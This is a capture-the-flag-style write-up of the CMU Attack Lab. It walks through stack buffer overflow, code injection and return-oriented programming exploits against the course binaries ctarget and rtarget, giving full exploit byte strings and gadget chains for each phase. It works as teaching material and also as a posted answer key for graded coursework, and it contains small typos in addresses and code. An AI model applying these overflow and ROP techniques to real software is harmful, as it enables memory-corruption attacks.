> NOTE: Use -q to unlink the server

# Phase 1

As is mentioned, there's function *getbuf* called:

``` c
void test(){
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val)
}
```

Here's the assembly code of getbuf:

``` c
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

+ The function will get *0x28* chars, then *retq*

+ As is required, we should run *touch1* after execution:

  > Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.

+ As mentioned, we use **buffer overflow**

+ Input 0x28 (40) chars (no matter how they are, we don't care about that), then input the address of *touch1* (*00000000004017c0*)

+ The address of *touch1* should be input increasing, as the stack's address is decreasing

``` c
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

Then, we use *HEX2RAW* to change it:

``` c
./hex2raw < level1.txt > raw_level1.txt
```

It's the answer of level 1

``` c
./ctarget -q < raw_level1.txt
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

# Phase 2

Similar as **Phase 1**, we need to run *touch2*

``` c
void touch2(unsigned val){
    vlevel = 2;
    if(val == cookie){
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    }else{
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

``` c
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
  401809:	bf 01 00 00 00       	mov    $0x1,%edi
  40180e:	b8 00 00 00 00       	mov    $0x0,%eax
  401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401818:	bf 02 00 00 00       	mov    $0x2,%edi
  40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
  401822:	eb 1e                	jmp    401842 <touch2+0x56>
  401824:	be 10 31 40 00       	mov    $0x403110,%esi
  401829:	bf 01 00 00 00       	mov    $0x1,%edi
  40182e:	b8 00 00 00 00       	mov    $0x0,%eax
  401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
  401838:	bf 02 00 00 00       	mov    $0x2,%edi
  40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
  401842:	bf 00 00 00 00       	mov    $0x0,%edi
  401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
```

Using *gdb* see the address of *rsp* is: 

``` c
(gdb) info registers rsp
rsp            0x5561dca0          0x5561dca0
```

As the string length is *0x28*, the address of the string is *0x5561dca0 - 0x28 = 0x5561dc78* (as the stack address grow decreasing)

Here *val* is saved in *$edi*, and we want it to be equal as *cookie*. From the output of level1, we could get that *cookie* equals to *0x59b997fa*, thus the assembly we want to run is like:

``` c
pushq $0x4017ec # push the address of touch 2
mov $0x59b997fa, %edi # save cookie into edi
retq # return
```

Then, we can use *gcc -c* to compile, and use *objdump* to see the script:

``` c
0000000000000000 <.text>:
   0:	68 ec 17 40 00       	pushq  $0x4017ec
   5:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
   a:	c3                   	retq   
```

Next, we fill him with *00* until its length is *0x28*. At the end, we write the starting address of the string (as we calculated before). Thus, the answer is:

``` c
68 ec 17 40 00 bf fa 97 b9 59 c3
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

``` c
./ctarget -q < raw_level2.txt
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:68 EC 17 40 00 BF FA 97 B9 59 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
```

# Phase 3

In Phase 3, there's function *hexmatch* and *touch3*:

``` c
int hexmatch(unsigned val, char *sval){
    char cbuf[110];
    // make position of check string unpredictable
    char *s = cbuf + random()%100;
    sprintf(s,"%.8x",val);
    return strncmp(sval,s,0) == 0;
}
void touch3(char *sval){
    vlevel = 3; // Part of validation protocol
    if(hexmatch(cookie,sval)){
        printf("Touch3!: You called touch3(\"%s\")",sval);
        validate(3);
    }else{
        printf("Misfire: You called touch3(\"%s\")",sval);
        fail(3);
    }
    exit(0);
}
```

So the purpose is to run *touch3*, and satisfy *hexmatch*.

+ This time *hexmatch* check string (cookie) with an array

  + Cookie is *0x59b997fa*

  + Change it to array (using ascii code)

    35 39 62 39 39 37 66 61

+ The address of *touch3* is *0x4018fa*

+ The head address is still *0x5561dca0*, and the injection address is still *0x5561dca0-0x28=0x5561dc78*

+ Because of *cbuf* (make position of check string unpredictable), we can't simply input cookie in the string

  + We save it after *%rsp*.
  + The new address is *0x5561dca0 + 0x8 = 0x55651dca8*

Thus, the assembly code should be:

```c
pushq $0x4018fa
mov $0x5561dca8, %edi
retq
```

Using gdb, we get

``` c
0000000000000000 <.text>:
   0:	68 fa 18 40 00       	pushq  $0x4018fa
   5:	bf a8 dc 61 55       	mov    $0x5561dca8,%edi
   a:	c3                   	retq   
```

So the answer is:

``` C
68 fa 18 40 00 bf a8 dc 61 55 c3
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

``` C
./ctarget -q < raw_level3.txt
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:68 FA 18 40 00 BF A8 DC 61 55 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61
```

# Return-Oriented Programming

> Since Phase 4, we use *RTARGET*
>
> + It uses randomization so that the stack positions differ from one run to another. This makes it impossible to determine where your injected code will be located.
> + It marks the section of memory holding the stack as nonexecutable, so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault
> + Here we define the code we could use(gadeget farm) between *start_farm* and *end_farm*

The strategy with ROP is to identify **byte sequences** within an exisiting program that consist of one or more instructions followed by instruction *ret*. Such a segment is referred to as a *gadget*.

A gadget can make use of code corresponding to assembly-language statements generated by the compiler, especially ones at the ends of functions. In practice, there may be some useful gadgets of this form, but not enough to implement many important operations. For example, it is highly unlikely that a compiled function would have *popq %rdi* as its last instruction before *ret*. Fortunately, with a byte-oriented instruction set, such as x86-64, a gadget can often be found by extracting patterns from other parts of the instruction byte sequence.

For example, for the following C function

``` C
void setval_210(unsigned *p){
    *p = 3347663060U;
}
```

In assembly, it is:

``` C
0000000000400f15 <setval_210>:
400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)
400f1b: c3 retq
```

The byte sequence *48 89 c7* encodes the instruction *movq %rax, %rdi*.

# Phase 4

Phase 4 does same thing we done in Phase 2, but for RTARGET. This time we can't inject code, but could **jump to exising code**

Observation:

+ We want to save content in *%edi* / *%rdi*

  + Using *popq* or *movq*
  + No *popq* about %edi in disassembly code
  + so we choose:

  ``` C
  00000000004019c3 <setval_426>:
    4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
    4019c9:	c3                   	retq   
  ```

  Here we could have:

  ``` C
  48 89 c7 movq %rax, %rdi
  c3		 retq
  ```

  the address is *0x4019c3 + 0x2 = 0x4019c5*. 

+ Another we want to use is to save it in *%rax* through *popq*

  ``` c
  00000000004019ca <getval_280>:
    4019ca:    b8 29 58 90 c3           mov    $0xc3905829,%eax
    4019cf:    c3                       retq   
  ```

  Here we could have:

  ``` C
  58 90 popq %rax
  c3	  retq
  ```

  The address is *0x4019ca+0x2=0x4019cc*. 

Thus, the answer is:

``` C
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

+ Line 1: enable buffer overflow
+ Line 2: *popq %rax*
+ Line 3: Input cookie
+ Line 4: *movq %rax, %rdi*
+ Line 5: address of *touch2*

And that's the answer.

``` C
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

# Phase 5

Phase 5 is similar as phase 3. Because of buffer size & randomization, we should save data at *%rsp + bias*.

> P5 only have 5/100 marks... It's really waste of time.

We could use:

``` C
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   
```

to make *%rax = %rdi + %rsi*.

+ Push *%rsp* to *%rdi*
+ Push bias to *%rsi*
+ Using *add_xy*, add address and *bias* to gether in *%rax*, then take it to *%rdi*
+ Using *touch 3*

Here's the code we use and the answer:

+ Enable buffer overflow

+ *movq %rsp,%rax*

  + address: *401a06*

  ``` C
  0000000000401a03 <addval_190>:
    401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
    401a09:	c3                   	retq   
  ```

+ *movq %rax,%rdi*

  + address: *4019a2*

  ``` C
  00000000004019a0 <addval_273>:
    4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
    4019a6:	c3                   	retq   
  ```

+ *popq %rax*

  + address: *4019cc*

  ``` C
  00000000004019ca <getval_280>:
    4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
    4019cf:	c3                   	retq   
  ```

+ Push *0x48* in *rax*

  ``` C
  48 00 00 00 00 00 00 00    
  ```

+ *movl %eax,%edx*

  + address: *4019dd*

  ``` C
  00000000004019db <getval_481>:
    4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
    4019e0:	c3                   	retq   
  ```

+ *movl %edx,%ecx*

  + address: *401a34*

  ``` C
  0000000000401a33 <getval_159>:
    401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
    401a38:	c3                   	retq   
  ```

+ *movl %ecx,%esi*

  + address: *401a13*

  ``` C
  0000000000401a11 <addval_436>:
    401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
    401a17:	c3                   	retq   
  ```

+ *lea (%rdi,%rsi,1),%rax*

  + address: *4019d6*

  ``` C
  00000000004019d6 <add_xy>:
    4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
    4019da:	c3                   	retq  
  ```

+ *movq %rax,%rdi*

  + address: *4019a2*, appeared before

+ Run *touch3*

  + address: *4018fa*

+ Array number

  + Same as Phase 3, *35 39 62 39 39 37 66 61 00*

So the answer is:

``` C
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
cc 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61 00
```

``` C
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 
```

